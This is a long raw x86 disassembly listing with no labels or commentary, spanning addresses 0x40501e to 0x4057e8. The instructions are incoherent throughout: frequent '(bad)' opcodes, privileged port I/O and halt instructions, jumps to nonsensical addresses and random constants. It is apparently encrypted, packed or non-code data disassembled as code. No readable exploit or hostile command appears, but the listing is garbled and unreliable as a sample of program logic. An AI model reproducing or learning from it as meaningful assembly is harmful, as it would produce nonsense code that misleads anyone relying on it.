  40501e:	(bad)  
  405020:	or     DWORD PTR [edx-0x11e907f0],0x6a
  405027:	es dec eax
  405029:	pop    es
  40502a:	add    al,bl
  40502c:	xchg   ebx,eax
  40502d:	and    eax,DWORD PTR [eax-0xc]
  405030:	pop    ecx
  405031:	mov    bh,BYTE PTR [esi]
  405033:	and    eax,0x29428c22
  405038:	xchg   esi,eax
  405039:	or     BYTE PTR [esi+0x6e70af3f],bl
  40503f:	(bad)  
  405040:	jecxz  0x405035
  405042:	arpl   ax,si
  405044:	mov    edi,0x465b1e1d
  405049:	xchg   ecx,eax
  40504a:	cmp    BYTE PTR [edi+ecx*1+0x87bd675],ch
  405051:	sahf   
  405052:	int3   
  405053:	scas   al,BYTE PTR es:[edi]
  405054:	dec    ecx
  405055:	addr16 das 
  405057:	or     edi,DWORD PTR [edi-0x28db6163]
  40505d:	lahf   
  40505e:	mov    ds:0x8996985d,al
  405063:	mov    eax,ds:0x3230038e
  405068:	(bad)  
  405069:	cmp    esp,ebp
  40506b:	(bad)  
  40506c:	cmp    DWORD PTR [ebp-0x5d08400f],eax
  405072:	daa    
  405073:	inc    esp
  405074:	fwait
  405075:	scas   al,BYTE PTR es:[edi]
  405076:	pop    eax
  405077:	pop    eax
  405078:	sbb    DWORD PTR [edi],0x64c3b32c
  40507e:	mov    ebx,0x27abe110
  405083:	mov    edx,0xb1743a37
  405088:	es cwde 
  40508a:	sub    al,0x94
  40508c:	loop   0x405024
  40508e:	rcr    BYTE PTR [ebp-0x5],1
  405091:	fisubr DWORD PTR [ebx+0x30]
  405094:	mov    ecx,0xeef3faab
  405099:	inc    eax
  40509a:	aaa    
  40509b:	adc    edx,DWORD PTR [ecx-0x3e474016]
  4050a1:	pop    edx
  4050a2:	fwait
  4050a3:	push   0x13
  4050a5:	jmp    0xfd2d268
  4050aa:	sbb    eax,0x87e2dc59
  4050af:	scas   eax,DWORD PTR es:[edi]
  4050b0:	fld    DWORD PTR [eax]
  4050b3:	jp     0x405067
  4050b5:	or     eax,DWORD PTR [ebx+ebx*1-0x53bfea5b]
  4050bc:	popa   
  4050bd:	fnstsw WORD PTR [edx]
  4050bf:	daa    
  4050c0:	mov    ebp,0xd7ec8e47
  4050c5:	xor    al,BYTE PTR [ebp-0x28]
  4050c8:	pop    es
  4050c9:	(bad)  
  4050ca:	iret   
  4050cb:	sub    bl,BYTE PTR [edx+0x3c]
  4050ce:	push   DWORD PTR [esi+0x13]
  4050d1:	mov    BYTE PTR [ebp+0x26],ch
  4050d4:	push   edx
  4050d5:	mov    eax,0x50253f7c
  4050da:	enter  0x664f,0xe6
  4050de:	pop    esi
  4050df:	imul   edx,DWORD PTR [esp+ecx*8-0x6],0x68
  4050e4:	or     eax,0x7702383a
  4050e9:	rcl    BYTE PTR [eax-0x651e439d],0xd8
  4050f0:	fcomi  st,st(6)
  4050f2:	sbb    al,0xea
  4050f4:	mov    edi,DWORD PTR [edx]
  4050f6:	imul   edx,DWORD PTR [ebp-0x22],0xd301dd9e
  4050fd:	inc    ebx
  4050fe:	push   ecx
  4050ff:	int3   
  405100:	hlt    
  405101:	mov    eax,ds:0x18d5b75a
  405106:	push   esp
  405107:	enter  0xe1d2,0xc
  40510b:	into   
  40510c:	(bad)  
  40510d:	mov    ch,0xc2
  40510f:	or     DWORD PTR [esp+ecx*8+0xc442e3a],edx
  405116:	hlt    
  405117:	fcmovnu st,st(6)
  405119:	ja     0x405182
  40511b:	jo     0x40518f
  40511d:	jbe    0x40509f
  40511f:	cld    
  405120:	lods   al,BYTE PTR ds:[esi]
  405121:	jbe    0x405199
  405123:	xlat   BYTE PTR ds:[ebx]
  405124:	lods   al,BYTE PTR ds:[esi]
  405125:	xchg   ebx,eax
  405126:	pop    ebp
  405127:	jp     0x405116
  405129:	jnp    0x405135
  40512b:	(bad)  
  40512c:	and    al,0x6
  40512e:	(bad)  
  40512f:	(bad)
  405133:	push   ss
  405134:	call   FWORD PTR [ebx+0x38]
  405137:	jo     0x40514a
  405139:	adc    DWORD PTR [esi+ebp*1-0x12],esp
  40513d:	jo     0x40518b
  40513f:	xchg   DWORD PTR [edi],edx
  405141:	xor    esi,DWORD PTR [eax+0x3ba4775a]
  405147:	lds    esi,FWORD PTR [esi]
  405149:	jne    0x4050e1
  40514b:	retf   
  40514c:	outs   dx,DWORD PTR ds:[esi]
  40514d:	(bad)  
  40514e:	js     0x4051cb
  405150:	dec    eax
  405151:	cdq    
  405152:	sub    eax,0x107109d5
  405157:	cmp    eax,0x606c7494
  40515c:	ins    BYTE PTR es:[edi],dx
  40515d:	sub    BYTE PTR [edx+0x5b],ch
  405160:	fldcw  WORD PTR [edi]
  405162:	inc    BYTE PTR [eax]
  405164:	pop    edx
  405165:	int    0x1e
  405167:	cmc    
  405168:	fisub  WORD PTR [edx+0x603ecd7d]
  40516e:	ja     0x4051c1
  405170:	add    bh,dh
  405172:	lods   eax,DWORD PTR ds:[esi]
  405173:	enter  0xd286,0x50
  405177:	test   eax,0x634267c6
  40517c:	test   DWORD PTR [ebp+0x56],0xef5afc37
  405183:	dec    ebx
  405184:	in     eax,0x35
  405186:	pop    ecx
  405187:	cmp    al,0x16
  405189:	test   BYTE PTR [edx+ebx*8-0x64d0f119],ch
  405190:	aam    0x5d
  405192:	fs dec ebp
  405194:	das    
  405195:	bound  esp,QWORD PTR [edx+edi*2]
  405198:	adc    BYTE PTR [ebp*2+0x6d21ac0e],ch
  40519f:	and    DWORD PTR [esi-0x8],ecx
  4051a2:	push   0x835cfc7d
  4051a7:	mov    bl,0x44
  4051a9:	out    0x8,eax
  4051ab:	pusha  
  4051ac:	mov    eax,ds:0x8a6aac74
  4051b1:	sbb    DWORD PTR ds:0xa595e82b,ebp
  4051b7:	sbb    ch,BYTE PTR [ebx+0xb]
  4051ba:	sbb    al,0x89
  4051bc:	sub    al,dl
  4051be:	mov    dl,0x1d
  4051c0:	add    DWORD PTR [ebp+0x59],ebp
  4051c3:	mov    ds:0xc2b9795b,al
  4051c8:	pusha  
  4051c9:	mov    eax,ds:0x442d1b22
  4051ce:	loope  0x4051b1
  4051d0:	or     al,0xb9
  4051d2:	push   ecx
  4051d3:	cmp    DWORD PTR [edx+0x5b],ebp
  4051d6:	jl     0x4051f3
  4051d8:	pushf  
  4051d9:	xor    edx,DWORD PTR [edi+eiz*2-0x5e]
  4051dd:	pop    ds
  4051de:	xchg   edx,eax
  4051df:	fwait
  4051e0:	or     ah,BYTE PTR [edx]
  4051e2:	jno    0x405185
  4051e4:	loope  0x4051ea
  4051e6:	out    0xae,al
  4051e8:	mov    edx,0x6e28326f
  4051ed:	add    DWORD PTR [ecx],ebp
  4051ef:	jmp    0x40520c
  4051f1:	std    
  4051f2:	sti    
  4051f3:	out    0x1,eax
  4051f5:	push   edx
  4051f6:	pop    ds
  4051f7:	sub    al,0x29
  4051f9:	sahf   
  4051fa:	popf   
  4051fb:	cwde   
  4051fc:	or     eax,0x3792ad43
  405201:	stos   BYTE PTR es:[edi],al
  405202:	fcom   QWORD PTR [ebx-0x369f1625]
  405208:	retf   
  405209:	mov    ecx,0x8b4fd549
  40520e:	mov    BYTE PTR [esp+ecx*1-0x393d2101],bh
  405215:	fiadd  WORD PTR ss:[ebp-0x1d]
  405219:	lock jmp 0x6edd7b04
  40521f:	lahf   
  405220:	lock or esi,edi
  405223:	int3   
  405224:	iret   
  405225:	jnp    0x4051cc
  405227:	xchg   ebx,eax
  405228:	pop    ds
  405229:	int3   
  40522a:	fisttp DWORD PTR [edi+0x1f]
  40522d:	int    0x63
  40522f:	sbb    edx,DWORD PTR [ebp-0x6cdacb30]
  405235:	fst    DWORD PTR [edi+0x32c30358]
  40523b:	mov    ebp,0xf267cbf4
  405240:	outs   dx,DWORD PTR ds:[esi]
  405241:	inc    ebx
  405242:	rcr    BYTE PTR ds:0x467544dd,cl
  405248:	gs hlt 
  40524a:	add    DWORD PTR [esi+0x554eb028],ebx
  405250:	and    BYTE PTR [edx],bh
  405252:	rcr    BYTE PTR [esi],0x81
  405255:	icebp  
  405256:	adc    al,0x18
  405258:	dec    edx
  405259:	jnp    0x4052c2
  40525b:	add    ch,BYTE PTR [ecx]
  40525d:	add    BYTE PTR [ecx],dl
  40525f:	push   ds
  405260:	ja     0x405284
  405262:	mov    esp,eax
  405264:	lock jbe 0x405214
  405267:	dec    ecx
  405268:	cmp    DWORD PTR [ecx+0x2a],esp
  40526b:	aam    0xee
  40526d:	aaa    
  40526e:	out    0xa5,eax
  405270:	jns    0x4052c6
  405272:	test   al,0x73
  405274:	test   DWORD PTR ss:[ecx+0x65],0x3f891746
  40527c:	cmp    al,BYTE PTR [eax]
  40527e:	or     al,0x43
  405280:	in     eax,dx
  405281:	xchg   DWORD PTR [ecx-0x72d9864],eax
  405287:	sbb    dh,dl
  405289:	adc    dl,al
  40528b:	into   
  40528c:	js     0x4052da
  40528e:	jge    0x405215
  405290:	call   0x335:0xd45daf35
  405297:	mov    ebx,edx
  405299:	xor    al,0xa0
  40529b:	xchg   ebx,eax
  40529c:	out    dx,al
  40529d:	push   esp
  40529e:	in     al,0xc6
  4052a0:	mov    dh,bh
  4052a2:	and    eax,0xc5602482
  4052a7:	imul   eax,DWORD PTR [ecx-0x6f],0x48
  4052ab:	and    cl,BYTE PTR [esi]
  4052ad:	ror    BYTE PTR [ecx+0x3c980be],1
  4052b3:	imul   BYTE PTR [ebx]
  4052b5:	inc    ecx
  4052b6:	xor    bl,BYTE PTR [edi+0x28eaf3ab]
  4052bc:	cli    
  4052bd:	pop    ds
  4052be:	and    BYTE PTR [edi-0xe3895f1],0xd8
  4052c5:	adc    eax,0x4174896b
  4052ca:	out    dx,al
  4052cb:	dec    eax
  4052cc:	hlt    
  4052cd:	dec    esp
  4052ce:	xchg   ecx,eax
  4052cf:	bound  ebx,QWORD PTR [ebx+0x71]
  4052d2:	and    BYTE PTR [ecx],bl
  4052d4:	cmp    DWORD PTR [esp+ebp*2-0x25e2d0d7],0x7811e5b6
  4052df:	es inc eax
  4052e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4052e2:	jl     0x40535a
  4052e4:	fucomp st(6)
  4052e6:	push   edi
  4052e7:	shl    DWORD PTR ds:0x6f3d13a2,0xda
  4052ee:	xchg   DWORD PTR [edx+0x10712af8],esi
  4052f4:	mov    WORD PTR [ebx],fs
  4052f6:	sbb    eax,0xb50753d6
  4052fb:	or     al,0x95
  4052fd:	je     0x405291
  4052ff:	adc    eax,0xd7974968
  405304:	test   dh,0xd4
  405307:	and    cl,ch
  405309:	xor    eax,esp
  40530b:	xor    ecx,DWORD PTR [edi-0x2f]
  40530e:	pop    esi
  40530f:	sub    edi,DWORD PTR [edx+0xb]
  405312:	stos   DWORD PTR es:[edi],eax
  405313:	clc    
  405314:	(bad)
  405318:	jnp    0x405379
  40531a:	into   
  40531b:	shl    BYTE PTR [esi+0x21024323],0x8e
  405322:	xchg   esi,eax
  405323:	inc    BYTE PTR ds:0x8285c1ba
  405329:	loop   0x40537a
  40532b:	mov    eax,ds:0x6511445c
  405330:	in     al,0x13
  405332:	or     DWORD PTR [eax-0xa],0xffffffa4
  405336:	cmp    DWORD PTR [edx+0x1cea358b],eax
  40533c:	pop    ds
  40533d:	adc    ah,BYTE PTR [ecx*8-0x5f56e090]
  405344:	gs mov ah,0xf7
  405347:	stos   BYTE PTR es:[edi],al
  405348:	pushf  
  405349:	dec    ecx
  40534a:	test   al,bl
  40534c:	adc    al,0x23
  40534e:	sub    BYTE PTR [edx],bl
  405350:	xcrypt-ecb (bad)
  405351:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405352:	mov    eax,es
  405354:	sbb    BYTE PTR [eax+ecx*2+0x51],dl
  405358:	fwait
  405359:	push   ss
  40535a:	xchg   edi,eax
  40535b:	pushf  
  40535c:	jne    0x4052e6
  40535e:	jg     0x4052eb
  405360:	or     al,0xf8
  405362:	sub    al,0xb4
  405364:	das    
  405365:	adc    eax,esp
  405367:	aaa    
  405368:	mov    edi,0x6dbfa133
  40536d:	xchg   ebx,eax
  40536e:	add    edi,ebp
  405370:	mov    ebx,0x10124500
  405375:	push   es
  405376:	std    
  405377:	xchg   edi,eax
  405378:	and    esi,edi
  40537a:	aam    0xb2
  40537c:	sar    DWORD PTR ds:0xfdf691f,1
  405382:	out    0xaf,eax
  405384:	push   ss
  405385:	es out dx,al
  405387:	pop    ebx
  405388:	cmp    eax,0x88328423
  40538d:	in     eax,dx
  40538e:	and    ch,BYTE PTR [edi+0x68]
  405391:	xor    DWORD PTR [esi+0x55],ecx
  405394:	push   ecx
  405395:	test   BYTE PTR [edi-0x7b],bl
  405398:	xchg   BYTE PTR [eax],ch
  40539a:	and    DWORD PTR [edi+ebp*4-0x5d],ecx
  40539e:	fidiv  WORD PTR [edi+0x4e]
  4053a1:	xchg   ecx,eax
  4053a2:	fst    QWORD PTR [eax]
  4053a4:	mov    DWORD PTR [ecx+0x12],ebp
  4053a7:	(bad)  
  4053a9:	and    al,0xeb
  4053ab:	fisttp WORD PTR [edi+0x58]
  4053ae:	lahf   
  4053af:	dec    eax
  4053b0:	jns    0x405390
  4053b2:	stc    
  4053b3:	push   ecx
  4053b4:	sbb    al,0xed
  4053b6:	lods   al,BYTE PTR ds:[esi]
  4053b7:	pop    eax
  4053b8:	xchg   ecx,eax
  4053b9:	stc    
  4053ba:	lea    edi,[ebx+0x59bba6bc]
  4053c0:	and    ecx,ecx
  4053c2:	imul   esi,DWORD PTR [edi-0x1efaeb7],0xffffffe5
  4053c9:	sbb    al,0x54
  4053cb:	sbb    esp,DWORD PTR [ebx]
  4053cd:	xor    bh,BYTE PTR [esi+0x6aa750cc]
  4053d3:	repnz pusha 
  4053d5:	ins    DWORD PTR es:[edi],dx
  4053d6:	cmp    BYTE PTR [edx+0x63d8a52f],bl
  4053dc:	shl    DWORD PTR [edi+0x6f843d48],cl
  4053e2:	pop    es
  4053e3:	into   
  4053e4:	cmp    ecx,DWORD PTR [edi+eax*4]
  4053e7:	push   cs
  4053e8:	xchg   edi,eax
  4053e9:	dec    ebx
  4053ea:	cmp    DWORD PTR ds:0x64ca5bd4,edx
  4053f0:	fisub  DWORD PTR [eax-0x1c]
  4053f3:	arpl   WORD PTR [esi+0x4b],bx
  4053f6:	sti    
  4053f7:	and    esp,ecx
  4053f9:	push   ss
  4053fa:	popf   
  4053fb:	xchg   ecx,eax
  4053fc:	mov    esp,0x2015e22b
  405401:	cmp    al,0x5d
  405403:	pusha  
  405404:	jne    0x405479
  405406:	push   es
  405407:	push   ebx
  405408:	add    ebx,esp
  40540a:	sub    eax,DWORD PTR [edx+eiz*2-0x29]
  40540e:	and    ch,al
  405410:	pop    ebp
  405411:	test   BYTE PTR [ebx],cl
  405413:	hlt    
  405414:	mov    eax,ds:0xa0e807e6
  405419:	aam    0x32
  40541b:	pop    esi
  40541c:	sti    
  40541d:	loope  0x4053ff
  40541f:	hlt    
  405420:	mov    ebx,0x392ad72b
  405425:	or     BYTE PTR [edx],0x4f
  405428:	mov    al,ds:0xc7d1304c
  40542d:	cmp    eax,0xfe72da02
  405432:	xchg   BYTE PTR [esi+0x71a277b7],bh
  405438:	dec    ebx
  405439:	pusha  
  40543a:	sbb    eax,0xd01f8f48
  40543f:	push   ss
  405440:	das    
  405441:	or     cl,ch
  405443:	aaa    
  405444:	cwde   
  405445:	dec    ecx
  405446:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405447:	inc    edi
  405448:	(bad)  
  405449:	push   ecx
  40544a:	push   ds
  40544b:	adc    esp,DWORD PTR [edi]
  40544d:	add    DWORD PTR [ebx+0x1e],ecx
  405450:	or     bh,dh
  405452:	dec    ebx
  405453:	js     0x4053dc
  405455:	cdq    
  405456:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405457:	or     al,al
  405459:	jo     0x4054cd
  40545b:	mov    DWORD PTR [edi+0x4e6b2d6a],ebx
  405461:	jge    0x40546f
  405463:	push   esp
  405464:	mov    dh,0xc5
  405466:	mov    bl,0xc4
  405468:	push   edi
  40546a:	rol    edx,cl
  40546c:	aad    0x43
  40546e:	out    0x75,al
  405470:	xchg   ebp,eax
  405471:	jg     0x4054e2
  405473:	adc    esp,DWORD PTR [ecx]
  405475:	cmp    DWORD PTR [ebx-0x62],ebp
  405478:	outs   dx,DWORD PTR es:[esi]
  40547a:	in     eax,0xa9
  40547c:	fwait
  40547d:	xchg   esp,eax
  40547e:	xor    DWORD PTR [ebp+0x31],esp
  405481:	cmp    edx,DWORD PTR [ebp-0x2c256e70]
  405487:	inc    ebx
  405488:	jne    0x405420
  40548a:	imul   edi,DWORD PTR [ecx+0x412f46bd],0xdea68485
  405494:	xor    ah,dh
  405496:	pop    ss
  405497:	mov    eax,ds:0x1f8d851f
  40549c:	repnz push ecx
  40549e:	push   esp
  40549f:	mov    edi,0xde948c81
  4054a4:	mov    dl,0xf6
  4054a6:	pop    ds
  4054a7:	sub    al,0x11
  4054a9:	mov    ds:0x295fc7d5,eax
  4054af:	int    0x47
  4054b1:	cli    
  4054b2:	imul   BYTE PTR [ebp+0x3f]
  4054b5:	sbb    eax,edi
  4054b7:	loope  0x4054e9
  4054b9:	daa    
  4054ba:	stc    
  4054bb:	sub    al,0xda
  4054bd:	lahf   
  4054be:	scas   eax,DWORD PTR es:[edi]
  4054bf:	pop    eax
  4054c0:	(bad)  
  4054c1:	mov    ah,0xde
  4054c3:	or     eax,0x5dd1aae3
  4054c8:	(bad)  
  4054c9:	das    
  4054ca:	dec    esp
  4054cb:	fmul   st,st(2)
  4054cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4054ce:	dec    eax
  4054cf:	loopne 0x4054b8
  4054d1:	adc    al,0xdf
  4054d3:	xchg   ecx,eax
  4054d4:	pop    ds
  4054d5:	cld    
  4054d6:	jnp    0x4054c3
  4054d8:	inc    esi
  4054d9:	or     esi,edi
  4054db:	(bad)  
  4054dc:	mov    bh,BYTE PTR [edi]
  4054de:	or     ebx,eax
  4054e0:	not    DWORD PTR [ebp+0x67936bf2]
  4054e6:	das    
  4054e7:	dec    ebx
  4054e8:	xchg   ebp,eax
  4054e9:	jbe    0x4054d9
  4054eb:	jmp    0x4054dd
  4054ed:	pushf  
  4054ee:	scas   eax,DWORD PTR es:[edi]
  4054ef:	test   eax,0xd455154
  4054f4:	in     eax,0xa4
  4054f6:	push   ebp
  4054f7:	ins    BYTE PTR es:[edi],dx
  4054f8:	xchg   esp,esp
  4054fa:	mov    ebp,0x95471d1a
  4054ff:	stos   BYTE PTR es:[edi],al
  405500:	std    
  405501:	jl     0x405521
  405503:	and    ebx,edi
  405505:	jle    0x4054f6
  405507:	mov    bh,BYTE PTR [eax]
  405509:	(bad)  
  40550a:	test   DWORD PTR [ecx],0x63762d7
  405510:	push   DWORD PTR [edx+0x488ba488]
  405516:	jg     0x405515
  405518:	dec    esp
  405519:	push   0xffffff9c
  40551b:	xchg   ebp,eax
  40551c:	push   eax
  40551d:	inc    esp
  40551e:	jecxz  0x40558d
  405520:	call   0x8627d19
  405525:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405526:	xor    al,0x72
  405528:	adc    al,0x1a
  40552a:	jb     0x4055a4
  40552c:	xor    ch,bl
  40552e:	jne    0x4054f5
  405530:	pop    ss
  405531:	or     eax,ebx
  405533:	lods   eax,DWORD PTR ss:[esi]
  405535:	adc    BYTE PTR [eax],cl
  405537:	mov    al,ds:0xf19a549f
  40553c:	stc    
  40553d:	js     0x4054ef
  40553f:	mov    ds:0x822aa17b,al
  405544:	and    ebp,DWORD PTR [ecx-0x53fbc376]
  40554a:	retf   0x4cd3
  40554d:	mov    dh,ah
  40554f:	dec    esp
  405550:	retf   0x6632
  405553:	add    eax,0x8b590bd1
  405558:	mov    ecx,0x7a27e3
  40555d:	mov    ebp,0xdbe6cd75
  405562:	xor    ebx,esi
  405564:	xchg   DWORD PTR [ebx+edi*4],esp
  405567:	test   eax,0x6c4ada9c
  40556c:	xchg   ebx,eax
  40556d:	add    al,0x9c
  40556f:	or     eax,0xb0dba23c
  405574:	(bad)  
  405575:	repz pusha 
  405577:	in     eax,dx
  405578:	inc    ecx
  405579:	sub    DWORD PTR [edx-0x204c08c3],esi
  40557f:	mov    esp,ecx
  405581:	mov    ch,0x94
  405583:	cmp    bh,dl
  405585:	div    DWORD PTR [edx+0x3f]
  405588:	push   0xf940041f
  40558d:	dec    ebp
  40558e:	fcmovnbe st,st(2)
  405590:	push   es
  405591:	xor    ecx,edx
  405593:	fcmovne st,st(4)
  405595:	loopne 0x4055bc
  405597:	mov    eax,0x31988a3d
  40559c:	imul   edi,DWORD PTR [edi-0x20c11780],0x423cf143
  4055a6:	mov    eax,ds:0x39c61487
  4055ab:	test   eax,0x21e260b9
  4055b0:	enter  0x6a6a,0xd0
  4055b4:	das    
  4055b5:	push   ebx
  4055b6:	jecxz  0x405606
  4055b8:	cmc    
  4055b9:	xchg   esp,eax
  4055ba:	adc    BYTE PTR [ebx+0x74ad8e40],0x9c
  4055c1:	add    edx,eax
  4055c3:	push   ebx
  4055c4:	pop    edi
  4055c5:	adc    eax,0x7333f250
  4055ca:	push   es
  4055cb:	les    edx,FWORD PTR ds:0x2897e98f
  4055d1:	addr16 dec ebx
  4055d3:	lods   al,BYTE PTR ds:[esi]
  4055d4:	xchg   esi,eax
  4055d5:	jmp    0x405564
  4055d7:	outs   dx,DWORD PTR ds:[esi]
  4055d8:	sbb    esi,DWORD PTR [ebp+0x54b21aac]
  4055de:	in     al,0xe7
  4055e0:	out    0x59,eax
  4055e2:	mov    al,0xb9
  4055e4:	push   ss
  4055e5:	and    ecx,esi
  4055e7:	sbb    DWORD PTR [edi],eax
  4055e9:	push   cs
  4055ea:	sar    DWORD PTR [ebx+0x32bdd510],1
  4055f0:	push   es
  4055f1:	mov    edi,0x833a7b49
  4055f6:	in     al,dx
  4055f7:	add    BYTE PTR [edi-0x1b],bl
  4055fa:	popa   
  4055fb:	jmp    0x9063:0x2e818456
  405602:	lock or bh,BYTE PTR [ebp+0x1341f84d]
  405609:	(bad)  
  40560a:	jmp    0xe2721c62
  40560f:	cmp    eax,0x26bbd521
  405614:	mov    WORD PTR [ebx+0x25],ss
  405617:	push   eax
  405618:	sti    
  405619:	or     BYTE PTR [edi+0x3bedb403],al
  40561f:	mov    al,0xd2
  405621:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405622:	inc    esp
  405623:	or     ebx,DWORD PTR [edi-0x36452fe6]
  405629:	retf   0x396c
  40562c:	test   ebx,eax
  40562e:	pop    esp
  40562f:	je     0x4055ee
  405631:	add    al,0x81
  405633:	jmp    0x4055cf
  405635:	jl     0x25d2210a
  40563b:	outs   dx,DWORD PTR ds:[esi]
  40563c:	sub    eax,0xc6eb7c96
  405641:	(bad)  
  405642:	xchg   ebx,eax
  405643:	mov    al,0xc6
  405645:	push   0x69
  405647:	sbb    ecx,ecx
  405649:	add    DWORD PTR [edi+0x3bc1e65],0x135c8653
  405653:	push   edx
  405654:	jmp    DWORD PTR [edx+0x68]
  405657:	cmp    al,0xb3
  405659:	fsub   st,st(3)
  40565b:	pop    edi
  40565c:	into   
  40565d:	adc    DWORD PTR [edx-0x3e821c1f],ebp
  405663:	je     0x4056d2
  405665:	retf   0xcc36
  405668:	pop    edi
  405669:	add    al,0x96
  40566b:	add    eax,0x5ca60f00
  405670:	and    eax,esi
  405672:	stc    
  405673:	xchg   esi,eax
  405674:	std    
  405675:	push   ecx
  405676:	lea    edx,[esi]
  405678:	cmp    ebx,ecx
  40567a:	in     eax,0xe4
  40567c:	mov    ch,0x8a
  40567e:	lds    edi,FWORD PTR [eax+edi*1]
  405681:	lea    edi,[ecx-0x18126b25]
  405687:	and    edi,DWORD PTR [ecx+0x4c28590b]
  40568d:	cmp    eax,0x95e9f8c1
  405692:	test   al,cl
  405694:	inc    BYTE PTR [eax]
  405696:	jge    0x4056c8
  405698:	jo     0x405718
  40569a:	(bad)  
  40569c:	pop    ds
  40569d:	adc    DWORD PTR [edi+eiz*1+0x1cc92baa],ebx
  4056a4:	or     dh,BYTE PTR [edx-0x46]
  4056a7:	ins    BYTE PTR es:[edi],dx
  4056a8:	pop    edi
  4056a9:	into   
  4056aa:	jnp    0x405681
  4056ac:	pushf  
  4056ad:	lahf   
  4056ae:	or     al,0x70
  4056b0:	and    al,0xf3
  4056b2:	dec    esp
  4056b3:	mov    ds:0x7d9fbd1a,eax
  4056b8:	inc    edx
  4056b9:	lds    ebp,FWORD PTR [esp-0x61]
  4056bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4056be:	scas   al,BYTE PTR es:[edi]
  4056bf:	loopne 0x405646
  4056c1:	cmp    edi,DWORD PTR [edi+edi*1]
  4056c4:	pop    ss
  4056c5:	xor    dh,dl
  4056c7:	stos   DWORD PTR es:[edi],eax
  4056c8:	in     eax,dx
  4056c9:	inc    ebx
  4056ca:	stos   BYTE PTR es:[edi],al
  4056cb:	jge    0x4056a7
  4056cd:	xor    al,0x9b
  4056cf:	fdiv   QWORD PTR [edx]
  4056d1:	xor    BYTE PTR [eax+0xd],ch
  4056d4:	ror    BYTE PTR ds:[edx+0x2f],cl
  4056d8:	inc    edx
  4056d9:	mov    ebp,eax
  4056db:	sbb    eax,0xfad2bdb0
  4056e0:	js     0x4056c8
  4056e2:	push   es
  4056e3:	jns    0x405742
  4056e5:	and    BYTE PTR [edx],dl
  4056e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056e8:	sub    BYTE PTR [esi],bh
  4056ea:	sub    cl,bh
  4056ec:	inc    ebp
  4056ed:	sub    al,0x85
  4056ef:	scas   eax,DWORD PTR es:[edi]
  4056f0:	das    
  4056f1:	mov    ch,0xf4
  4056f3:	jae    0x405685
  4056f5:	adc    BYTE PTR [edi+0xde88766],dh
  4056fb:	mov    edx,0x7dba574f
  405700:	(bad)  
  405701:	jne    0x405735
  405703:	inc    eax
  405704:	mov    ecx,0xece7869a
  405709:	push   cs
  40570a:	shl    BYTE PTR [ecx],cl
  40570c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40570d:	mov    eax,DWORD PTR [eax]
  40570f:	xchg   esi,eax
  405710:	cmp    ecx,DWORD PTR [eax+0x24]
  405713:	out    dx,eax
  405714:	cmp    dl,BYTE PTR [edi]
  405716:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405717:	ret    0xecd8
  40571a:	push   ecx
  40571b:	clc    
  40571c:	add    ah,ch
  40571e:	jl     0x40578e
  405720:	push   edx
  405721:	xchg   ebx,eax
  405722:	cmp    al,0xda
  405724:	std    
  405725:	(bad)  
  405726:	xor    DWORD PTR [esi],esp
  405728:	xchg   ebx,eax
  405729:	inc    eax
  40572a:	scas   eax,DWORD PTR es:[edi]
  40572b:	stos   BYTE PTR es:[edi],al
  40572c:	jecxz  0x40577e
  40572e:	out    dx,al
  40572f:	or     al,0xda
  405731:	inc    ebx
  405732:	fst    DWORD PTR [eax-0x29]
  405735:	inc    esi
  405736:	enter  0x9eea,0x6f
  40573a:	ret    0x6be5
  40573d:	test   al,0x98
  40573f:	repz enter 0x41fd,0x41
  405744:	mov    dh,0x51
  405746:	xor    BYTE PTR [ebx-0x1c5fb46f],ch
  40574c:	lds    ecx,FWORD PTR [esp+edi*2]
  40574f:	xchg   edx,eax
  405750:	(bad)  
  405751:	in     eax,0x9b
  405753:	adc    al,0x28
  405755:	(bad)  
  405756:	mov    dh,0x5d
  405758:	out    0x4d,al
  40575a:	xor    DWORD PTR [ebx-0x68],eax
  40575d:	push   ebx
  40575e:	icebp  
  40575f:	sub    ax,0xdbb5
  405763:	ins    DWORD PTR es:[edi],dx
  405764:	jne    0x405735
  405766:	add    ebp,eax
  405768:	push   cs
  405769:	sub    eax,0x8889f61b
  40576e:	(bad)  
  40576f:	hlt    
  405770:	sub    ebp,edi
  405772:	push   esp
  405773:	add    BYTE PTR [edi+0x6b],bh
  405776:	cld    
  405777:	popa   
  405778:	fdiv   QWORD PTR [ebp-0x25f68c6]
  40577e:	and    BYTE PTR [edx-0x3d21dcbe],dl
  405784:	ffreep st(4)
  405786:	fild   WORD PTR [ecx-0x1c103e1]
  40578c:	push   ecx
  40578d:	fcom   DWORD PTR [eax+0x39faed29]
  405793:	dec    eax
  405794:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405795:	xor    ecx,0xfffffff0
  405798:	icebp  
  405799:	js     0x4057c6
  40579b:	lea    ebp,[ebp+0x23a70947]
  4057a1:	pop    es
  4057a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4057a3:	std    
  4057a4:	mov    eax,ds:0x56a3a118
  4057a9:	hlt    
  4057aa:	inc    esp
  4057ab:	or     al,0x67
  4057ad:	dec    edi
  4057ae:	jne    0x4057d1
  4057b0:	pusha  
  4057b1:	or     DWORD PTR [ebx-0x61],0xffffffcf
  4057b5:	mov    bh,0x48
  4057b7:	mov    esp,0x973c19dc
  4057bc:	mov    eax,0xeb496576
  4057c1:	mov    WORD PTR [edi],ss
  4057c3:	clc    
  4057c4:	mov    dl,0x7
  4057c6:	pop    ebp
  4057c7:	inc    edx
  4057c8:	sbb    al,0xe6
  4057ca:	xchg   edx,eax
  4057cb:	mov    dh,0x35
  4057cd:	add    al,0xac
  4057cf:	sbb    BYTE PTR [edi-0x5c],0x31
  4057d3:	loopne 0x405819
  4057d5:	not    DWORD PTR [eax-0x39798a6e]
  4057db:	fs jo  0x40582f
  4057de:	sbb    ebp,DWORD PTR [edi-0x18595909]
  4057e4:	mov    al,0x8a
  4057e6:	adc    al,0x90
  4057e8:	xchg   esp,eax
